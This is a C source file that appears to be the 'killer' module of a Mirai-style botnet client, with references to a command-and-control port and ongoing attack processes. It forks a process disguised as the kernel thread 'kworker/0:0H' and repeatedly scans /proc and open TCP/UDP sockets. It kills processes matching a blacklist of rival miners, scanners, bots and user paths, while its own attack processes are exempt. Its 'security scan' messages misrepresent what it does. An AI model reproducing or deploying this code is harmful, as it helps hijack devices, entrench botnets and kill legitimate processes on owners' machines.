#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <dirent.h>
#include <unistd.h>
#include <time.h>
#include <sys/prctl.h>  // Added for prctl

#include "killer.h"
#include "config.h"

// External variables (defined in bot.c)

// Whitelisted system paths
const char *whitelisted_paths[] = {
    "/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/",
    "/lib/", "/usr/lib/", "/usr/lib64/", "/opt/",
    "/etc/", "/proc/", "/sys/", "/dev/", "/run/"
};

// Blacklisted patterns (competitors, miners, etc.)
const char *blacklisted_patterns[] = {
    "/tmp", "/var/tmp", "/dev/shm", "/root/",
    "/boot", "/home", "/media", "/mnt",
    "xig", "xmr", "monero", "crypto", "miner",
    "ddgs", "pnscan", "masscan", "zmap", "nmap",
    ".bash", ".ssh", ".config",  // Fixed: removed invalid escape sequences
    "kworker", "kthrotld", "ksoftirqd",
    "watchdog", "migration", "rcu_sched",
    "softbot", "bot", "malware", "virus",
    ".arm", ".mips", ".ppc", ".x86",  // Fixed: removed invalid escape sequences
    "(deleted)", "unreachable", "kdevtmpfs",
    "kinsing", "kthreadd", "kworker", "kswapd"
};

// Whitelisted ports (common services)
const int whitelisted_ports[] = {
    22, 80, 443, 53, 123, 25, 110, 143,
    993, 995, 3306, 5432, 6379, 8080, 8443,
    21, 23, 465, 587, 993, 995, 1194
};

int is_whitelisted(pid_t pid, const char *cmdline, const char *exe, const char *maps) {
    (void)maps; // Silence unused parameter warning
    
    // Whitelist our own processes
    if (pid == main_pid || pid == watcher_pid || pid == getpid() || pid == getppid())
        return 1;

    // Whitelist attack processes
    for (int i = 0; i < 10; i++) {
        if (attack_ongoing[i] == pid)
            return 1;
    }

    // Whitelist system paths
    if (exe) {
        for (size_t i = 0; i < sizeof(whitelisted_paths)/sizeof(whitelisted_paths[0]); i++) {
            if (strstr(exe, whitelisted_paths[i])) 
                return 1;
        }
    }

    if (cmdline) {
        for (size_t i = 0; i < sizeof(whitelisted_paths)/sizeof(whitelisted_paths[0]); i++) {
            if (strstr(cmdline, whitelisted_paths[i])) 
                return 1;
        }
    }

    return 0;
}

int is_blacklisted(const char *cmdline, const char *exe, const char *maps) {
    if (!cmdline && !exe && !maps) return 0;

    // Check blacklisted patterns
    for (size_t i = 0; i < sizeof(blacklisted_patterns)/sizeof(blacklisted_patterns[0]); i++) {
        if (cmdline && strstr(cmdline, blacklisted_patterns[i]))
            return 1;
        if (exe && strstr(exe, blacklisted_patterns[i]))
            return 1;
        if (maps && strstr(maps, blacklisted_patterns[i]))
            return 1;
    }

    // Suspicious command patterns
    if (cmdline) {
        char lower_cmdline[1024];
        strncpy(lower_cmdline, cmdline, sizeof(lower_cmdline)-1);
        for (char *p = lower_cmdline; *p; p++) *p = tolower(*p);

        if (strstr(lower_cmdline, "miner") || 
            strstr(lower_cmdline, "xmr") ||
            strstr(lower_cmdline, "monero") ||
            strstr(lower_cmdline, "crypto") ||
            strstr(lower_cmdline, "ddos") ||
            strstr(lower_cmdline, "botnet")) {
            return 1;
        }
    }

    return 0;
}

int is_whitelisted_port(int port) {
    for (size_t i = 0; i < sizeof(whitelisted_ports)/sizeof(whitelisted_ports[0]); i++) {
        if (port == whitelisted_ports[i])
            return 1;
    }
    return (cnc_port == port);
}

pid_t find_pid_by_inode(unsigned int inode) {
    DIR *dir = opendir("/proc");
    if (!dir) return -1;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd", pid);

        DIR *fddir = opendir(fd_path);
        if (!fddir) continue;

        struct dirent *fdent;
        while ((fdent = readdir(fddir))) {
            if (fdent->d_type != DT_LNK) continue;

            char link_path[512], link_buf[1024];
            snprintf(link_path, sizeof(link_path), "%s/%s", fd_path, fdent->d_name);

            ssize_t len = readlink(link_path, link_buf, sizeof(link_buf)-1);
            if (len <= 0) continue;
            link_buf[len] = 0;

            if (strstr(link_buf, "socket:[")) {
                unsigned int found_inode;
                if (sscanf(link_buf, "socket:[%u]", &found_inode) == 1) {
                    if (found_inode == inode) {
                        closedir(fddir);
                        closedir(dir);
                        return pid;
                    }
                }
            }
        }
        closedir(fddir);
    }
    closedir(dir);
    return -1;
}

void killer_stat(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/stat", pid);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char line[1024];
        if (!fgets(line, sizeof(line), fp)) {
            fclose(fp);
            continue;
        }
        fclose(fp);

        char *start = strchr(line, '(');
        char *end = strrchr(line, ')');
        if (!start || !end) continue;

        char comm[256] = {0};
        strncpy(comm, start+1, end - start - 1);

        if (is_whitelisted(pid, comm, NULL, NULL)) 
            continue;

        if (is_blacklisted(comm, NULL, NULL)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Killer] Killed pid: %d | Stat: %s\n", pid, comm);
            #endif
        }
    }
    closedir(dir);
}

void killer_exe(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256], exe[1024] = {0};
        snprintf(path, sizeof(path), "/proc/%d/exe", pid);

        ssize_t len = readlink(path, exe, sizeof(exe)-1);
        if (len <= 0) continue;
        exe[len] = 0;

        if (is_whitelisted(pid, NULL, exe, NULL)) 
            continue;

        if (is_blacklisted(NULL, exe, NULL)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Killer] Killed pid: %d | Exe: %s\n", pid, exe);
            #endif
        }
    }
    closedir(dir);
}

void killer_ps(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char cmdline[1024] = {0};
        size_t n = fread(cmdline, 1, sizeof(cmdline)-1, fp);
        fclose(fp);
        if (!n) continue;

        for (size_t i = 0; i < n; i++) {  // Fixed: changed int to size_t
            if (cmdline[i] == '\0') cmdline[i] = ' ';
        }

        if (is_whitelisted(pid, cmdline, NULL, NULL)) 
            continue;

        if (is_blacklisted(cmdline, NULL, NULL)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Killer] Killed pid: %d | Cmdline: %s\n", pid, cmdline);
            #endif
        }
    }
    closedir(dir);
}

void killer_maps(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/maps", pid);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char maps[4096] = {0};
        size_t n = fread(maps, 1, sizeof(maps)-1, fp);
        fclose(fp);
        if (!n) continue;

        if (is_whitelisted(pid, NULL, NULL, maps)) 
            continue;

        if (is_blacklisted(NULL, NULL, maps)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Killer] Killed pid: %d | Maps: %s\n", pid, maps);
            #endif
        }
    }
    closedir(dir);
}

void killer_tcp(void) {
    FILE *fp = fopen("/proc/net/tcp", "r");
    if (!fp) return;

    char line[512];
    fgets(line, sizeof(line), fp); // Skip header

    while (fgets(line, sizeof(line), fp)) {
        unsigned int inode;
        char local_addr[128];

        if (sscanf(line, "%*d: %64[0-9A-Fa-f]:%*x %*s %*s %*s %*s %*s %*s %u",
                   local_addr, &inode) != 2) {
            continue;
        }

        char *colon = strrchr(local_addr, ':');
        if (!colon) continue;
        unsigned int port = strtoul(colon + 1, NULL, 16);

        if (is_whitelisted_port(port)) 
            continue;

        pid_t pid = find_pid_by_inode(inode);
        if (pid == -1) continue;

        char cmdline[1024] = {0};
        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

        FILE *cmd_fp = fopen(path, "r");
        if (cmd_fp) {
            fread(cmdline, 1, sizeof(cmdline)-1, cmd_fp);
            fclose(cmd_fp);

            for (size_t i = 0; i < sizeof(cmdline); i++) {  // Fixed: changed int to size_t
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }

            if (is_whitelisted(pid, cmdline, NULL, NULL)) 
                continue;

            if (is_blacklisted(cmdline, NULL, NULL)) {
                kill(pid, SIGKILL);
                #ifdef DEBUG
                printf("[Killer] Killed pid: %d | TCP: %s\n", pid, cmdline);
                #endif
            }
        }
    }
    fclose(fp);
}

void killer_udp(void) {
    FILE *fp = fopen("/proc/net/udp", "r");
    if (!fp) return;

    char line[512];
    fgets(line, sizeof(line), fp);

    while (fgets(line, sizeof(line), fp)) {
        unsigned int inode;
        char local_addr[128];

        if (sscanf(line, "%*d: %64[0-9A-Fa-f]:%*x %*s %*s %*s %*s %*s %*s %u",
                   local_addr, &inode) != 2) {
            continue;
        }

        char *colon = strrchr(local_addr, ':');
        if (!colon) continue;
        unsigned int port = strtoul(colon + 1, NULL, 16);

        if (is_whitelisted_port(port)) 
            continue;

        pid_t pid = find_pid_by_inode(inode);
        if (pid == -1) continue;

        char cmdline[1024] = {0};
        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

        FILE *cmd_fp = fopen(path, "r");
        if (cmd_fp) {
            fread(cmdline, 1, sizeof(cmdline)-1, cmd_fp);
            fclose(cmd_fp);

            for (size_t i = 0; i < sizeof(cmdline); i++) {  // Fixed: changed int to size_t
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }

            if (is_whitelisted(pid, cmdline, NULL, NULL)) 
                continue;

            if (is_blacklisted(cmdline, NULL, NULL)) {
                kill(pid, SIGKILL);
                #ifdef DEBUG
                printf("[Killer] Killed pid: %d | UDP: %s\n", pid, cmdline);
                #endif
            }
        }
    }
    fclose(fp);
}

void killer_scan(void) {
    printf("\033[1;33m[Killer] Scanning for threats...\033[0m\n");
    
    killer_stat();
    killer_exe();
    killer_ps();
    killer_maps();
    killer_tcp();
    killer_udp();
    
    printf("\033[1;32m[Killer] Security scan completed\033[0m\n");
}

void killer_main(void) {
    pid_t pid = fork();
    if (pid != 0) return;

    // Set killer process name
    char name[32] = "kworker/0:0H";
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);

    printf("\033[1;32m[Killer] Security system activated\033[0m\n");
    
    int scan_count = 0;
    while (1) {
        killer_scan();
        scan_count++;
        
        if (scan_count % 10 == 0) {
            printf("\033[1;36m[Killer] Protected system for %d cycles\033[0m\n", scan_count);
        }
        
        sleep(KILLER_INTERVAL);
    }
}
